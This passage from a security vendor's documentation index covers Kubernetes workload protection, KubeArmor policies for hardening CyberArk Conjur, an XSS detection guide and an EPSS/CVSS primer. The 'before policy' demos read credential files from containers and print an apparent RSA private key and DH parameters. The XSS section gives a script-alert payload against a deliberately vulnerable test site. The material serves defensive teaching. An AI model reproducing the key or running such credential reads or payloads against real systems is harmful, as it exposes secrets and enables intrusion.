hybrid/multi-cloud environments. It Operates as final security defense layer, complementing KSPM by providing runtime protection against potential breaches and provides visibility into workload behavior with consistent security for Kubernetes, Virtual Machines, Containers, and Serverless Workloads.</p>"},{"location":"use-cases/cwpp/#cwpp-use-cases","title":"CWPP Use Cases","text":""},{"location":"use-cases/cwpp/#container-security","title":"Container Security","text":"<p>Container Image Scan</p> <p>Runtime Application Hardening</p> <p>Workload Hardening</p> <p>Network Micro-segmentation</p> <p>Cluster Misconfiguration Scan</p> <p>Pod Security Admission Control</p> <p>Admission Controller</p>"},{"location":"use-cases/cwpp/#least-permissive-posture-assessment","title":"Least Permissive Posture Assessment","text":"<p>Runtime Application Behavior Discovery</p> <p>Audit/Forensics</p> <p>Zero Trust Security</p>"},{"location":"use-cases/cwpp/#ai-workload-security-advanced-persistent-threat","title":"AI Workload Security &amp; Advanced Persistent Threat","text":"<p>Jupyter Notebook</p> <p>Cryptojacking</p> <p>Hildegard</p>"},{"location":"use-cases/cwpp/#securing-secrets-manager","title":"Securing Secrets Manager","text":"<p>HashiCorp Vault Hardening</p> <p>CyberArk Conjur Hardening</p>"},{"location":"use-cases/cwpp/#accuknox-cwpp-core-capabilities","title":"Accuknox CWPP Core Capabilities","text":""},{"location":"use-cases/cwpp/#runtime-security-with-granular-control","title":"Runtime security with granular control","text":"<ul> <li>Restricted file system access</li> <li>Process whitelisting</li> <li>Network access limitations</li> </ul>"},{"location":"use-cases/cwpp/#key-technical-features","title":"Key Technical Features","text":"<ul> <li>eBPF-based kernel-level monitoring</li> <li>Inline attack prevention using Linux Security Modules</li> <li>Real-time workload behavior auditing</li> <li>Comprehensive cluster visibility</li> <li>Policy-based hardening</li> <li>Admission controller validation</li> <li>Zero-day attack mitigation</li> </ul> <p>Info</p> <p>For more information on our CWPP offerings, visit the AccuKnox CWPP Page.</p>"},{"location":"use-cases/cyberark-conjur/","title":"CyberArk Conjur Hardening","text":"<p>CyberArk Conjur manages the secrets required by applications and other non-human identities to gain access to critical infrastructure, data and other resources. Conjur secures this access by managing secrets with granular Role-Based Access Control (RBAC) and other security best practices and techniques.</p> Installing CyberArk Conjur <p>We can install CyberArk Conjur in the Kubernetes cluster by running the following shell script: <pre><code>#!/bin/bash\n\nCONJUR_NAMESPACE=conjur\nkubectl create namespace \"$CONJUR_NAMESPACE\"\nDATA_KEY=\"$(docker run --rm cyberark/conjur data-key generate)\"\nHELM_RELEASE=conjur\nVERSION=2.0.6\nhelm install \\\n-n \"$CONJUR_NAMESPACE\" \\\n--set dataKey=\"$DATA_KEY\" \\\n--set service.external.enabled=false \\\n\"$HELM_RELEASE\" \\\nhttps://github.com/cyberark/conjur-oss-helm-chart/releases/download/v$VERSION/conjur-oss-$VERSION.tgz\n</code></pre>  Now the CyberArK Conjur is installed in the Cluster and you can see the Conjur-oss and Conjur-postgres pods running in the Conjur Namespace.</p> <p></p> <p>Attack points in Conjur:</p> <p>CyberArk Conjur when deployed in the Kubernetes cluster stores sensitive information in the volume mount points. In the conjure-oss pod, the Conjur-nginx container stores the sensitive information in the etc/ssl and etc/nginx volume mount points.  Conjur-oss container has  /conjure-server volume mount point where the sensitive information is stored. In the Conjur-Postgres pod the sensitive information and secrets are stored in the /var/lib/postgresql/data and /etc/certs Volume mount points. </p> <p>So if any attacker who gets access to these Volume mount points through lateral movements might see this sensitive information and secrets. Also, they can do encryption of the data and ask for ransomware. We can prevent these types of attacks AccuKnox\u2019s runtime security engine KubeArmor. With the help of KubeArmor policies we can protect the access to these volume mount points and deny such attacks.</p> <p>Protecting Conjur-OSS Container:</p> <p>Before Applying policy:</p> <p>Currently, any attacker who gets access into the Conjur-oss pod can access the sensitive information stored in the /opt/conjur-server. <pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl exec -it -n conjur conjur-conjur-oss-698fbf6cd5-kb62v -c conjur-oss -- bash\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server# ls\nAPI_VERSION         Gemfile       SECURITY.md                              build_utils.sh         debify.sh           release\nCHANGELOG.md        Gemfile.lock  STYLE.md                                 config                 distrib             secrets.yml\nCODE_OF_CONDUCT.md  Jenkinsfile   UPGRADING.md                             config.ru              docker-compose.yml  spec\nCONTRIBUTING.md     LICENSE.md    VERSION                                  conjur-project-config  engines             tmp\nDEBIFY_IMAGE        NOTICES.txt   VERSION_APPLIANCE                        conjur_git_commit      gems\nDockerfile          Procfile      app                                      contrib                lib\nDockerfile.fpm      README.md     bin                                      cucumber               log\nDockerfile.test     README_CI.md  build-and-publish-internal-appliance.sh  cucumber.yml           public\nDockerfile.ubi      Rakefile      build.ps1                                db                     publish-images.sh\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server# cat secrets.yml\nREDHAT_API_KEY: !var redhat/projects/conjur/api-key\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server#\n</code></pre></p> <p>Policy:</p> <p>We can protect access to these volume mount points using the following policy:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: conjur-oss\n  namespace: conjur\nspec:\n  selector:\n    matchLabels:\n      kubearmor.io/container.name: '[conjur-oss]'\n  action: Allow\n  file:\n    matchDirectories:\n    - dir: /opt/conjur-server/\n      recursive: true\n      action: Block\n    - dir: /opt/conjur-server/\n      recursive: true\n      fromSource:\n      - path: /var/lib/ruby/bin/ruby\n      - path: /usr/bin/bash\n    - dir: /\n      recursive: true\n  process:\n    matchDirectories:\n    - dir: /\n      recursive: true\n  message: Conjur-oss policy\n</code></pre> <p>In the above policy we are only allowing</p> <ul> <li>/var/lib/ruby/bin/ruby  to access  /opt/conjur-server/ volume Mount</li> </ul> <p>All the other process will be denied access to /opt/conjur-server/</p> Applying policy: <p>Step 1: We can apply this policy using AccuKnox SaaS portal by navigating to the Runtimeprotection\u2192Policies section.  Step 2: Now select the create policy option from this screen.  Step 3: Click on the upload YAML option to upload the policy. Then select the cluster name and namespace where Conjur is installed.  Step 4: Click on the Save and select the Save to Workspace option to save the policy to the workspace.  Step 5: Now select the Conjur-oss policy from list and select the Apply Policy option to apply the policy.  Step 6: After applying the policy goes into the pending state for the administrator\u2019s approval.  Step 7: The administrator will review the policy and approves the policy.  Step 8: After approval policy goes into an active state. </p> <p>After Applying Policy:</p> <p>Now with the KubeArmor policy in place, any attacker who gets access to the container will not be able to access the Conjur-server volume mount point that has the secret files stored in it.</p> <pre><code>root@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server# ls\nls: cannot open directory '.': Permission denied\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server# cat secrets.yml\ncat: secrets.yml: Permission denied\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/opt/conjur-server#\n</code></pre> <p>KubeArmor logs:</p> <p>We can view the log alerts by navigating to the Monitors/Logging\u2192 logs</p> <p></p> <p>Protecting Conjur-Nginx:</p> <p>Before Applying policy:</p> <p>In the Conjur pod, if any attacker who gets access to the Conjur-nginx container can access the etc/nginx volume mount point</p> <pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl exec -it -n conjur conjur-conjur-oss-698fbf6cd5-kb62v -c conjur-nginx -- bash\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/# cd etc/nginx\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx# ls\ndhparams.pem  mime.types  nginx.conf  sites-enabled\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx# cat dhparams.pem\n-----BEGIN DH PARAMETERS-----\nMIIBCAKCAQEAhg2rRNwhgO8Nxc363bnKNKxb7xP8BXdQBnEHNxtqfpPRQViiP8K9\nfMHHvN5/QAeB0hCOEg6dhbYurOcT9ZfFy9BSC9QFTixfDmMHe9MT1VIYqvsXVyjO\nl/ivdCW0/eMZ5sc1Fcleym+TQzzrgnI0Kad17tmq4tvBKky+0YY4Q/M9BupZ7omc\nfyqhY+LyEqIjWuCd3eE7YQIonOrXJ+8xuOjl5uilFu4Zz+i4KeELmAG1WaOjvg+Z\ndJcve9soB3uaJW45jS/7cRl94VPJsfCJC/Z6E2R6CSPDgvytxL8aAM5FCyMQljN3\nvS9xNgsWz5gZqU3gbxW2dRgedjEvW5VHMwIBAg==\n-----END DH PARAMETERS-----\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx#\n</code></pre> <p>Policy:</p> <p>We can protect access to these volume mount points using the following policy:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: conjur-nginx\n  namespace: conjur\nspec:\n  selector:\n    matchLabels:\n      kubearmor.io/container.name: '[conjur-nginx]'\n  action: Allow\n  file:\n    matchDirectories:\n    - dir: /etc/nginx/\n      recursive: true\n      action: Block\n    - dir: /etc/nginx/\n      recursive: true\n      fromSource:\n      - path: /usr/sbin/nginx\n    - dir: /opt/conjur/etc/ssl/\n      recursive: true\n      action: Block\n    - dir: /opt/conjur/etc/ssl/\n      recursive: true\n      fromSource:\n      - path: /usr/sbin/nginx\n    - dir: /\n      recursive: true\n  process:\n    matchDirectories:\n    - dir: /\n      recursive: true\n  message: Conjur-nginx-policy\n</code></pre> <p>In the above policy, we are only allowing</p> <ul> <li>/usr/sbin/nginx to access  /opt/conjur/etc/ssl and /etc/nginx  volume Mount points</li> </ul> <p>All the other processes will be denied access to  /opt/conjur/etc/ssl and /etc/nginx  volume Mount points</p> Applying Policy : <p>Step 1: We can apply this policy using AccuKnox SaaS portal by navigating to the Runtime Protection\u2192Policies section.  Step 2: Now select the create policy option from this screen.  Step 3: Click on the upload YAML option to upload the policy. Then select the cluster name and namespace where Conjur is installed.  Step 4:  Click on the Save and select the Save to Workspace option to save the policy to the workspace.  Step 5:  Now select the Conjur-nginx policy from list and select the Apply Policy option to apply the policy.  Step 6:  After applying the policy goes into the pending state for the administrator\u2019s approval.  Step 7: The administrator will review the policy and approves the policy.  Step 8: After approval policy goes into an active state. </p> <p>After Applying Policy:</p> <p>With the kubeArmor policy applied, access to the Volume mount etc/nginx will be denied. The attacker will not be able to access the secrets stored in these Volume mount points.</p> <p><pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl exec -it -n conjur conjur-conjur-oss-698fbf6cd5-kb62v -c conjur-nginx -- bash\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/# cd etc/nginx\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx# ls\nls: cannot open directory '.': Permission denied\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx# cat dhparams.pem\ncat: dhparams.pem: Permission denied\nroot@conjur-conjur-oss-698fbf6cd5-kb62v:/etc/nginx#\n</code></pre> Karmor logs:</p> <p>We can view the log alerts by navigating to the Monitors/Logging\u2192 logs </p> <p>Protecting Conjur-Postgres:</p> <p>Before Applying Policy:</p> <p>In the Conjur-postgres pod, if an attacker gets access to the container can access the Volume mount points /etc/certs and /var/lib/postgresql/data which contains the sensitive data.</p> <p><pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl exec -it -n conjur conjur-postgres-0 -- bash\nroot@conjur-postgres-0:/# ls\nbin   dev                         docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var\nboot  docker-entrypoint-initdb.d  etc                   lib   media  opt  root  sbin  sys  usr\nroot@conjur-postgres-0:/# cd etc/certs\nroot@conjur-postgres-0:/etc/certs# ls\ntls.crt  tls.key\nroot@conjur-postgres-0:/etc/certs# cat tls.key\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA2hzzMQoSqxq5lDlLnuO7Bhj22qJptRFnJF2VSxISW9MBrInf\neaE9hYEpPQdcWCPI6m8qG30UnQg2NhIymEzMNwZoK200vRG8tE95IFTZ1woot+O2\n5RfCdX+X8ERFiGCWD6pDrbx5eO/QHLrU1lLng4wmRoJjWlS1KuD7NKRX7wXKOmEN\nduqZJX2uSzw1jgBJH522TiHfo2pzoZz39GUoV22qri7WD+/3YSJBIlZ/Ts7dc7gJ\nTD993l5LkIGQ7okuffM8i40Ph3/u50jabNuMaKtaRe+BQA8kJUGlGV6O+WoSc7uv\nliL10njXfXeIdlNYrdOwjPZ/Jwr8fj2z594wIwIDAQABAoIBAQCEkjgWxIKYUYQe\n3bxi9RRGHoJcXX9WuR8x8Ve+61sRSO2pi5uzeBfGv7zrBUBRql6Cb9LuJlaTI9yf\nfOwXugYeI9zJGHWHvfIuvmdnCWvm0pvxOY1/LbPaaxVUyopg3CQZnWnJfddvdIPQ\nEpcvNfDV+ieBj9sHmpkLWPgXBRUViBYDojwDdPcAu9XnWEvfDuzEEmNKFwRTSz+r\nrQF9RBxZYzRT93p9I/XNhWH08J4NsWbZuc7+qyEiT7a5qdXKMAqo0ZXyHt7k2XKJ\nsLplafZDzc+iMkani5J/ClDeFddZhlQ7oFsyjtOakDlzxOwBGFr48EBGP3llSIld\nQ5GtQgEBAoGBAPNs6vnv/D2dkMcJgiH09mQFxzb0SvATYYsZ3dj0AUYkU84akVMt\neQT5WTHY8jAkFk1MgsWlPqIwy7Ty2Z8K54efZr8hQW2D6/W2g57xDMfKQOWBmArk\nF/1r1eVOZTdBIcJgDNuc0i0JppfRABAZl+M5rysIGQiP9zL5RlvO16hjAoGBAOVh\nTHwxnf7Y8o4CJyexFQbsrTq/5KXLmZRPKWxw78Tb0R0RMZQuZjf4lWE5g6b0BUf8\nvIPtyTEKaCcd+u34AU0LbltUfa1gzRWxIO1zOCeXTrWZYujBUATdWoa7+4FyJNOH\nPlfX4kUu2iqRjKQdahV4LwCI/hzu55ST6JuwK4VBAoGBAIGgR4SvAiCBjn4fFxgk\nDSz4Urx13I35lCDxtkx4q1EBuUrwpOCpP1+htJix0U5HeUTScHT1aOQPnfqOs8pY\nkTCMdrdi6yd5b6aZ+X8jF84watyMZT2vdwLxcKa6V3XUDjkm0tIDsXxgPkFr/1+T\ncWmD5z7AAiyoFVgknA35mKfHAoGBALxm55CWnGQHQ2qaoBh83X17hmlb1ezLxxBG\n2QpF1NpHhoGubp98YN8WIXPi7pyBj5jqINjnxTmvh46hlEpDSqZCflkrk7KFcM2h\nWB9QZM43/CEypEfzB8uHGGTUICbZXyAS1IUIP8R9UBpoxDDELC8IMOrqmnWfULz7\no7HEyGpBAoGAU8y+BARyNA8KCbbWBCNjWQZFMw3u3RePbjQKiQwLurq/oGF57wPp\nuO9+ZwQhb6KDuL6pgytoxA28gvkWMOdcQUzs4ExMbkZbPbyvHECgtd3aL8gAsebt\nmT36DmCECP3zVYhO00PYBs+ImlGPgZpy3GoNkaPjy5noTEFLtJ7S5K4=\n-----END RSA PRIVATE KEY-----\nroot@conjur-postgres-0:/etc/certs#\n</code></pre> Policy:</p> <p>We can protect access to these volume mount points using the following policy:</p> <p><pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: conjur-postgres\n  namespace: conjur\nspec:\n  selector:\n    matchLabels:\n      app: conjur-oss-postgres\n  action: Allow\n  file:\n    matchDirectories:\n    - dir: /etc/certs/\n      recursive: true\n      action: Block\n    - dir: /etc/certs/\n      recursive: true\n      fromSource:\n      - path: /usr/lib/postgresql/10/bin/postgres\n    - dir: /var/lib/postgresql/data/\n      recursive: true\n      action: Block\n    - dir: /var/lib/postgresql/data/\n      recursive: true\n      fromSource:\n      - path: /usr/lib/postgresql/10/bin/postgres\n    - dir: /\n      recursive: true\n  process:\n    matchDirectories:\n    - dir: /\n      recursive: true\n    matchPaths:\n    - path: /bin/su\n      action: Block\n    - path: /usr/lib/postgresql/10/bin/psql\n      action: Block\n  message: Conjur-Postgres-policy\n</code></pre> In the above policy, we are only allowing</p> <ul> <li>/usr/lib/postgresql/10/bin/postgres to access  /var/lib/postgresql/data/  and  /etc/certs/ volume Mount points</li> </ul> <p>All the other processes will be denied access to  /var/lib/postgresql/data/  and  /etc/certs/  volume Mount points</p> Applying Policy: <p>Step 1: We can apply this policy using AccuKnox SaaS portal by navigating to the Runtime Protection\u2192Policies section.  Step 2: Now select the create policy option from this screen.  Step 3: Click on the upload YAML option to upload the policy. Then select the cluster name and namespace where Conjur is installed.  Step 4: Click on the Save and select the Save to Workspace option to save the policy to the workspace.  Step 5: Now select the Conjur-oss policy from list and select the Apply Policy option to apply the policy.  Step 6: After applying the policy goes into the pending state for the administrator\u2019s approval.  Step 7: The administrator will review the policy and approves the policy.  Step 8: After approval policy goes into an active state. </p> <p>After Applying Policy:</p> <p>With Kubearmor policy applied the attacker will not be able to access the Volume mount points /etc/certs and /var/lib/postgresql/data which contains the sensitive data.</p> <pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl exec -it -n conjur conjur-postgres-0 -- bash\nroot@conjur-postgres-0:/# ls\nbin   dev                         docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var\nboot  docker-entrypoint-initdb.d  etc                   lib   media  opt  root  sbin  sys  usr\nroot@conjur-postgres-0:/# cd etc/certs\nroot@conjur-postgres-0:/etc/certs# ls\nls: cannot open directory '.': Permission denied\nroot@conjur-postgres-0:/etc/certs# cat tls.key\ncat: tls.key: Permission denied\nroot@conjur-postgres-0:/etc/certs#\n</code></pre> <p>Karmor Logs:</p> <p>We can view the log alerts by navigating to the Monitors/Logging\u2192 logs</p> <p></p> <p>Thus using AccuKnox\u2019s Runtime Security Engine KubeArmor we have protected the access to secrets kept in the CyberArk Conjur.</p>"},{"location":"use-cases/dast-xss/","title":"Automated XSS Detection and Remediation with AccuKnox DAST","text":"<p>This guide demonstrates how to integrate AccuKnox's DAST (Dynamic Application Security Testing) Scanner into a CI/CD pipeline to automatically detect and remediate Cross-Site Scripting (XSS) vulnerabilities in web applications. By embedding security testing into the development workflow, organizations can proactively prevent exploitation of client-side injection flaws before they reach production.</p> <p>\ud83d\udd17 Check it out on GitHub Marketplace: AccuKnox DAST Scanner</p>"},{"location":"use-cases/dast-xss/#scenario-real-world-attack-example","title":"Scenario: Real-World Attack Example","text":"<p>Imagine an attacker exploiting an XSS vulnerability on a live application. Our simulation will target a test environment using http://testphp.vulnweb.com/, a deliberately vulnerable web application. An attacker injects a malicious script payload (<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>) into a user input field, causing an unsuspecting visitor's browser to execute arbitrary JavaScript.</p> <p>Such vulnerabilities can lead to session hijacking, sensitive data theft, or full account takeover.</p>"},{"location":"use-cases/dast-xss/#objective","title":"Objective","text":"<p>The purpose of this guide is to:</p> <ul> <li> <p>Detect XSS vulnerabilities early using AccuKnox DAST.</p> </li> <li> <p>Automate security validation in the development pipeline.</p> </li> <li> <p>Reduce manual testing efforts and prevent security breaches before deployment.</p> </li> </ul>"},{"location":"use-cases/dast-xss/#tools","title":"Tools","text":"<ul> <li> <p>AccuKnox -- CNAPP platform</p> </li> <li> <p>GitHub Actions -- CI/CD platform (similar to GitLab CI, Jenkins, etc.)</p> </li> </ul>"},{"location":"use-cases/dast-xss/#steps-overview","title":"Steps Overview","text":"<p>Here's a high-level overview of what we will implement:</p> <ul> <li> <p>Manual Setup: Manually identify an XSS vulnerability.</p> </li> <li> <p>Integrate DAST into GitHub Actions: Automatically find vulnerabilities.</p> </li> <li> <p>Before vs After Integration: Understand the value gained by proactive security.</p> </li> <li> <p>Viewing Findings: Analyze results on the AccuKnox SaaS dashboard.</p> </li> <li> <p>Remediation Workflow: Fix issues, create tickets, and verify remediation.</p> </li> </ul>"},{"location":"use-cases/dast-xss/#1-setup-manual-identification-of-xss","title":"1. Setup: Manual Identification of XSS","text":"<ol> <li> <p>Open http://testphp.vulnweb.com/.</p> </li> <li> <p>Locate a vulnerable input field (e.g., search bar, feedback form).</p> </li> <li> <p>Inject the payload:</p> <p><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p> </li> <li> <p>Submit the form.</p> </li> </ol> <p>If the injected script executes and you see an alert pop-up saying \"XSS\", the site is vulnerable. </p>"},{"location":"use-cases/dast-xss/#2-github-actions-workflow-integration-accuknox-dast","title":"2. GitHub Actions Workflow Integration (AccuKnox DAST)","text":"<p>Now let's automate detection using GitHub Actions.</p> <p>Create a GitHub Actions workflow at <code>.github/workflows/dast.yml</code>:</p> <pre><code>name: AccuKnox DAST Scan Workflow\n\non:\n  push:\n    branches:\n      - dast\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: Accuknox DAST\n        uses: accuknox/dast-scan-action@v1.0.0\n        with:\n          accuknox_token: ${{ secrets.ACCUKNOX_TOKEN }}\n          accuknox_endpoint: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          tenant_id: ${{ secrets.ACCUKNOX_TENANT_ID }}\n          label: ${{ secrets.ACCUKNOX_LABEL }}\n          target_url: \"http://testphp.vulnweb.com/\"\n          scan_type: \"full-scan\"\n</code></pre>"},{"location":"use-cases/dast-xss/#3-before-integration-challenges-and-risks","title":"3. Before Integration: Challenges and Risks","text":"<p>Without integrating security scanning into CI/CD:</p> <ul> <li> <p>Vulnerabilities go undetected until post-deployment.</p> </li> <li> <p>Attack surface grows over time.</p> </li> <li> <p>Manual pentesting becomes a bottleneck.</p> </li> <li> <p>Longer fix cycles after vulnerabilities are exploited.</p> </li> </ul>"},{"location":"use-cases/dast-xss/#4-after-integration-benefits","title":"4. After Integration: Benefits","text":"<p>After automating DAST scans with AccuKnox:</p> <ul> <li> <p>Immediate feedback allows developers to fix issues faster.</p> </li> <li> <p>Reduced time-to-fix XSS and other vulnerabilities.</p> </li> <li> <p>Continuous improvement of your security posture. </p> </li> </ul>"},{"location":"use-cases/dast-xss/#5-viewing-findings-on-accuknox-saas","title":"5. Viewing Findings on AccuKnox SaaS","text":"<p>After a scan completes:</p> <ol> <li> <p>Log into AccuKnox and navigate to Issues \u2192 Findings.</p> </li> <li> <p>Filter by Data Type: DAST Scan and search for the findings related to your repository. </p> </li> <li> <p>Review:</p> <ul> <li> <p>Vulnerabilities Detected: Including the XSS issue.</p> </li> <li> <p>Severity Ratings: Critical, High, Medium, Low.</p> </li> <li> <p>Evidence: Request/Response details showing the injected payload behavior.</p> </li> </ul> </li> </ol> <p></p> <p></p> <p>Tip: Use the filtering options to prioritize Critical and High vulnerabilities first.</p>"},{"location":"use-cases/dast-xss/#6-remediating-the-vulnerability","title":"6. Remediating the Vulnerability","text":""},{"location":"use-cases/dast-xss/#61-create-a-ticket","title":"6.1 Create a Ticket","text":"<ul> <li> <p>You can create a ticket directly from AccuKnox Findings by integrating your organization's ticketing system (Jira, ServiceNow, etc.) with AccuKnox.</p> </li> <li> <p>This ensures vulnerabilities detected during scans are automatically or manually ticketed for tracking and resolution.</p> </li> <li> <p>Refer to the integration guide for setup:   \ud83d\udd17 AccuKnox Jira Cloud Integration Guide</p> </li> </ul> <p></p>"},{"location":"use-cases/dast-xss/#62-fix-the-code","title":"6.2 Fix the Code","text":"<ul> <li> <p>Developers sanitize user inputs (e.g., using HTML escaping libraries).</p> </li> <li> <p>Implement input validation and output encoding best practices.</p> </li> </ul> <p>Example in JavaScript:</p> <pre><code>function sanitizeInput(input) {\n  return input.replace(/&lt;/g, \"&amp;lt;\").replace(/&gt;/g, \"&amp;gt;\");\n}\n</code></pre>"},{"location":"use-cases/dast-xss/#63-re-scanning","title":"6.3 Re-Scanning","text":"<ul> <li> <p>Trigger the GitHub Action for the DAST scan.</p> </li> <li> <p>Monitor if the XSS issue is no longer detected.</p> </li> </ul>"},{"location":"use-cases/dast-xss/#64-verification","title":"6.4 Verification","text":"<ul> <li> <p>In AccuKnox SaaS, check the latest scan.</p> </li> <li> <p>Confirm the previous vulnerability has disappeared from the findings list.</p> </li> <li> <p>Mark the Jira ticket as Resolved.</p> </li> </ul>"},{"location":"use-cases/dast-xss/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox DAST Scanning into your CI/CD workflows, you achieve:</p> <ul> <li> <p>Fast and automatic detection of XSS and other vulnerabilities.</p> </li> <li> <p>Proactive security validation at every stage of development.</p> </li> <li> <p>Reduced risk of web application breaches and compliance failures.</p> </li> </ul> <p>Integrating security into the pipeline ensures that vulnerabilities like XSS are caught early, remediated quickly, and prevented from ever reaching your production environments.</p>"},{"location":"use-cases/epss-scoring/","title":"Vulnerability Management with EPSS, CVSS, and CWE","text":""},{"location":"use-cases/epss-scoring/#introduction-to-epss","title":"Introduction to EPSS","text":"<p>The Exploit Prediction Scoring System (EPSS) was developed by the Forum of Incident Response and Security Teams (FIRST) to provide a predictive, data-driven score for each vulnerability based on its likelihood of being exploited. Unlike CVSS, which primarily assesses the severity of a vulnerability, EPSS calculates the probability of exploitation. This is done by using a machine learning model that incorporates real-time data from multiple sources such as:</p> <ul> <li> <p>Exploit databases (e.g., Exploit-DB, Metasploit)</p> </li> <li> <p>Threat intelligence feeds</p> </li> <li> <p>Historical exploitation data</p> </li> <li> <p>Contextual information from security researchers</p> </li> </ul>"},{"location":"use-cases/epss-scoring/#the-limitations-of-cvss","title":"The Limitations of CVSS","text":"<p>The Common Vulnerability Scoring System (CVSS) is a widely used model that calculates the severity of a vulnerability based on factors like attack complexity, impact on confidentiality, integrity, and availability. While CVSS helps determine how dangerous a vulnerability is in theory, it doesn't answer how likely it is to be exploited in real-world scenarios. CVSS provides a static severity score but fails to incorporate the dynamic nature of real-world attacks.</p> <ul> <li> <p>False sense of security: A vulnerability with a high CVSS score may not necessarily be exploited, especially if exploit code is not publicly available or if specific conditions need to be met for the exploit to work.</p> </li> <li> <p>Ignoring threat intelligence: CVSS does not consider the evolving nature of attack techniques or the availability of exploit tools that can simplify attacks.</p> </li> </ul>"},{"location":"use-cases/epss-scoring/#how-epss-complements-cvss","title":"How EPSS Complements CVSS","text":"<p>EPSS adds an additional layer of predictive analytics, focusing not just on how severe a vulnerability is but also on how likely it is to be actively exploited in the short term. By analyzing data points such as the availability of public exploits, exploitability in common attack chains, and historical exploitation trends, EPSS provides a more comprehensive, real-time picture of risk.</p> Metric CVSS (Common Vulnerability Scoring System) EPSS (Exploit Prediction Scoring System) Maintainer FIRST FIRST Score Range 0-10 0%-100% Score Meaning Reflects the severity of a vulnerability Indicates the likelihood of a vulnerability being exploited within the next 30 days Data Sources Based on base, temporal, and environmental metrics, which are incorporated into the score Uses a variety of data sources, including historical vulnerability data and real-time exploit information Updates Last updated in CVSS 3.1 Scores are updated daily through a machine learning-driven process; the model itself is periodically updated <p>Consider a CVE in the Apache Log4j vulnerability (CVE-2021-44228). This vulnerability initially had a high CVSS score due to its severe impact on systems, but its EPSS score was even higher, reflecting the urgency with which it was being actively exploited. Security teams worldwide rushed to patch it due to its high likelihood of being targeted by attackers.</p> <p></p> <p>The EPSS timeline for CVE-2021-44228 (Log4Shell) begins in early December 2021, before the CVE was officially published on December 10. During this period, EPSS was unaware of the vulnerability. On December 11, EPSS initially recorded a score of 0.355, as the CVE was published with 8 URLs listed as references. By December 15, when the exploit code was published to ExploitDB, the EPSS score increased to 0.633. The score jumped to 0.944 on December 17 after a Metasploit module was added. However, when the Metasploit module was removed on December 18, the score dropped back to 0.633. The score stabilized at 0.944 on January 12, 2022, when a new Metasploit module was added.</p> <p>Instead of solely relying on CVSS scores to prioritize vulnerabilities by severity, integrating EPSS allows you to focus on those with both high severity and a high likelihood of exploitation. This helps target the most immediate threats, ensuring more effective risk mitigation.</p> <p>However, EPSS does not account for additional environmental factors or estimate the impact of a vulnerability if exploited. As stated by the EPSS Special Interest Group (SIG), it \"is not, and should not be treated as a complete picture of risk.\" While EPSS is not fully transparent for closer evaluation, it remains a valuable tool to assess the risk posed by vulnerabilities and should be considered as one of the risk factors in prioritization decisions.</p>"},{"location":"use-cases/epss-scoring/#enhancing-vulnerability-prioritization-with-cwe","title":"Enhancing Vulnerability Prioritization with CWE","text":"<p>The Common Weakness Enumeration (CWE) is an essential resource for categorizing software and hardware weaknesses. Maintained by MITRE, CWE serves as an extensive glossary, helping security professionals systematically identify and address potential weaknesses before they lead to security issues. Entries like CWE-20 (Input Validation), CWE-125 (Out-of-Bounds Read), CWE-79 (Cross-Site Scripting), and CWE-200 (Information Disclosure) give insight into different types of vulnerabilities that could affect software security.</p> <p>With CWEs, you not only understand the nature of a vulnerability but also have a framework for managing risks in web applications and other software systems. When time and resources are limited, prioritizing these weaknesses effectively becomes essential for targeted, high-impact risk mitigation.</p>"},{"location":"use-cases/epss-scoring/#key-cwe-resources-for-prioritization","title":"Key CWE Resources for Prioritization","text":"<ul> <li> <p>CWE Top 25 Most Dangerous Software Weaknesses     A community-ranked list of the most common, high-impact software weaknesses, based on severity and exploitation potential. It's ideal for quickly identifying critical vulnerabilities when time is limited, prioritizing those with serious potential impact.</p> </li> <li> <p>CWE Top 10 KEV (Known Exploited Vulnerabilities)     Highlights the most actively exploited CWEs from CISA's KEV Catalog, representing urgent risks. Prioritize these vulnerabilities to address known, real-world threats effectively.</p> </li> </ul>"},{"location":"use-cases/epss-scoring/#integrating-cwe-cvss-and-epss-for-comprehensive-risk-assessment","title":"Integrating CWE, CVSS, and EPSS for Comprehensive Risk Assessment","text":"<p>For a holistic approach to vulnerability management, integrating CWE with CVSS and EPSS allows teams to assess vulnerabilities by severity, exploit likelihood, and underlying weakness. Prioritizing CWE weaknesses from the CWE Top 25 and CWE Top 10 KEV lists provides additional weight to the most critical weaknesses:</p> <ul> <li> <p>CWE + CVSS: Mapping CVSS scores to CWEs identifies which weaknesses lead to high-severity vulnerabilities, helping to prioritize those that pose the greatest potential impact.</p> </li> <li> <p>CWE + EPSS: Combining EPSS predictions with CWE classifications highlights weaknesses most likely to be exploited in real-world scenarios. Vulnerabilities with both high EPSS and CVSS scores, especially if they fall within CWE Top 25 or Top 10 KEV, should receive immediate attention.</p> </li> </ul> 